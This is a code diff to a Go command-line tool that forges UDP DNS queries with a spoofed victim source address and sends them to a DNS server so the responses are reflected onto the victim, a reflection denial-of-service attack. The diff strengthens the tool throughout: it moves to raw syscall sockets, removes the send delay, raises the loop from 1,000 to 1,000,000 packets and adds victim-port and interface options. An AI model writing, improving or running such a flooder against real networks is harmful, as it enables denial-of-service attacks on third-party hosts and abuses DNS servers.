@@ -2,16 +2,15 @@ package main
 
 import (
 	"errors"
-	"fmt"
+	"math/rand"
 	"net"
 	"os"
 	"strconv"
-	"time"
+	"syscall"
 
 	"github.com/akamensky/argparse"
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
-	"github.com/google/gopacket/pcap"
 	"github.com/rs/zerolog"
 	"github.com/rs/zerolog/log"
 )
@@ -19,37 +18,33 @@ import (
 var logger zerolog.Logger
 
 func sendLogger(victim string, dns string, dns_port int) {
-	logger.Info().Str("Sent request DNS to ", dns).Int("port", dns_port).Str("Reflected to victim ", victim).Msg("Successfully")
+	logger.Info().Str("Sent several packets to ", dns).Int("port", dns_port).Str("That got reflected to victim ", victim).Msg("Successfully")
 }
 
-func Spam_requests(victim string, dns string, dns_port int) {
-	dns_addr := dns + ":" + fmt.Sprint(dns_port)
-	iface := "h2-eth0"
-	handle, err := pcap.OpenLive(iface, 65536, false, pcap.BlockForever)
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer handle.Close()
+func create_packet(victim string, victim_port int, dns string, dns_port int) ([]byte, error) {
+	srcIP := net.ParseIP(victim).To4() //Spoofed IP
+	dnsIP := net.ParseIP(dns).To4()
 
 	ip := &layers.IPv4{
-		SrcIP:    net.ParseIP(victim).To4(), //Spoofed IP
-		DstIP:    net.ParseIP(dns_addr).To4(),
+		SrcIP:    srcIP,
+		DstIP:    dnsIP,
 		Protocol: layers.IPProtocolUDP,
 	}
 
 	udp := &layers.UDP{
-		SrcPort: 44444,
-		DstPort: 5353,
+		SrcPort: layers.UDPPort(victim_port),
+		DstPort: layers.UDPPort(dns_port),
 	}
+
 	udp.SetNetworkLayerForChecksum(ip)
 
-	// Minimal DNS query packet (for domain "google.com")
+	// Minimal DNS query packet (for domain "example.com")
 	dnsQuery := []byte{
 		0xaa, 0xaa, // ID
 		0x01, 0x00, // Standard query
 		0x00, 0x01, 0x00, 0x00, // 1 question, 0 answers
 		0x00, 0x00, 0x00, 0x00, // 0 authority, 0 additional
-		0x07, 'g', 'o', 'o', 'g', 'l', 'e',
+		0x07, 'e', 'x', 'a', 'm', 'p', 'l', 'e',
 		0x03, 'c', 'o', 'm', 0x00,
 		0x00, 0x01, 0x00, 0x01, // Type A, Class IN
 	}
@@ -57,25 +52,45 @@ func Spam_requests(victim string, dns string, dns_port int) {
 	buffer := gopacket.NewSerializeBuffer()
 	opts := gopacket.SerializeOptions{ComputeChecksums: true, FixLengths: true}
 
-	err = gopacket.SerializeLayers(buffer, opts,
+	err := gopacket.SerializeLayers(buffer, opts,
 		ip,
 		udp,
 		gopacket.Payload(dnsQuery),
 	)
+
 	if err != nil {
-		log.Fatal(err)
+		logger.Error().Err(err).Msg("Failed to serialize layers")
+		return nil, err
+	}
+
+	return buffer.Bytes(), nil
+}
+
+func send_requests(packet []byte, victim string, dns string, dns_port int, iface string) {
+	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_UDP)
+	if err != nil {
+		logger.Error().Err(err).Msg("Failed to create socket")
+		return
+	}
+	defer syscall.Close(fd)
+
+	err = syscall.BindToDevice(fd, iface)
+	if err != nil {
+		logger.Error().Err(err).Msg("Failed to bind to device")
 		return
 	}
 
-	for i := 0; i < 1000; i++ {
-		err := handle.WritePacketData(buffer.Bytes())
+	for i := 0; i < 1000000; i++ {
+		err = syscall.Sendto(fd, packet, 0, &syscall.SockaddrInet4{
+			Port: dns_port,
+			Addr: [4]byte(net.ParseIP(dns).To4()),
+		})
 		if err != nil {
-			logger.Error().Err(err).Msg("Failed to create send packet")
-		} else {
-			sendLogger(victim, dns, dns_port)
+			logger.Error().Err(err).Msg("Failed to send packet")
+			return
 		}
-		time.Sleep(50 * time.Millisecond)
 	}
+	sendLogger(victim, dns, dns_port)
 }
 
 func main() {
@@ -113,26 +128,43 @@ func main() {
 		},
 	})
 
+	victim_port := parser.Int("", "victim_port", &argparse.Options{
+		Required: false,
+		Help:     "Target victim_port must be between 1025 and 65535, default is random",
+		Default:  rand.Intn(65535-1025) + 1025,
+		Validate: func(args []string) error {
+			val, err := strconv.Atoi(args[0])
+			if err != nil {
+				return errors.New("victim port must be a number")
+			}
+
+			if val <= 0 || val >= 65535 {
+				return errors.New("victim port must be between 1 and 65535")
+			}
+			return nil
+		},
+	})
+
 	dns_server := parser.String("", "dns_server", &argparse.Options{
 		Required: true,
 		Help:     "Target Dns_server",
 		Validate: func(args []string) error {
 			if len(args[0]) == 0 {
-				return errors.New("Dns_server cannot be empty")
+				return errors.New("dns_server cannot be empty")
 			} else {
 				ip := net.ParseIP(args[0])
 				if ip == nil {
-					return errors.New("Dns_server must be a valid IP address")
+					return errors.New("dns_server must be a valid IP address")
 				}
 				if ip.To4() == nil {
-					return errors.New("Dns_server must be a valid IPv4 address")
+					return errors.New("dns_server must be a valid IPv4 address")
 				}
 				if ip.IsLoopback() {
-					return errors.New("Dns_server cannot be a loopback address")
+					return errors.New("dns_server cannot be a loopback address")
 				}
 
 				if ip.IsUnspecified() {
-					return errors.New("Dns_server cannot be an unspecified address")
+					return errors.New("dns_server cannot be an unspecified address")
 				}
 			}
 			return nil
@@ -141,7 +173,7 @@ func main() {
 
 	dns_port := parser.Int("", "dns_port", &argparse.Options{
 		Required: false,
-		Help:     "Target victim_port, default is 5353",
+		Help:     "Target dns_port, default is 5353",
 		Default:  5353,
 		Validate: func(args []string) error {
 			val, err := strconv.Atoi(args[0])
@@ -156,22 +188,29 @@ func main() {
 		},
 	})
 
-	/* for later use
-	threaded := parser.Int("t", "threaded", &argparse.Options{
-		Required: false,
-		Help:     "Enable threaded brute force mode with a limit of n threads. No effect if password list is not used",
+	iface := parser.String("i", "interface", &argparse.Options{
+		Required: true,
+		Help:     "Network interface to use for sending packets",
 		Validate: func(args []string) error {
-			val, err := strconv.Atoi(args[0])
-			if err != nil {
-				return errors.New("thread count must be a number")
-			}
-
-			if val <= 1 {
-				return errors.New("thread count must be greater than 1")
+			if len(args[0]) == 0 {
+				return errors.New("interface cannot be empty")
+			} else {
+				iface, err := net.InterfaceByName(args[0])
+				if err != nil {
+					return errors.New("interface must be a valid network interface")
+				}
+				if iface.Flags&net.FlagUp == 0 {
+					return errors.New("interface must be up")
+				}
 			}
 			return nil
 		},
-	})*/
+	})
 
-	Spam_requests(victim, dns_server, dns_port)
+	packet, err := create_packet(*victim, *victim_port, *dns_server, *dns_port)
+	if err != nil {
+		logger.Error().Err(err).Msg("Failed to create packet")
+		return
+	}
+	send_requests(packet, *victim, *dns_server, *dns_port, *iface)
 }
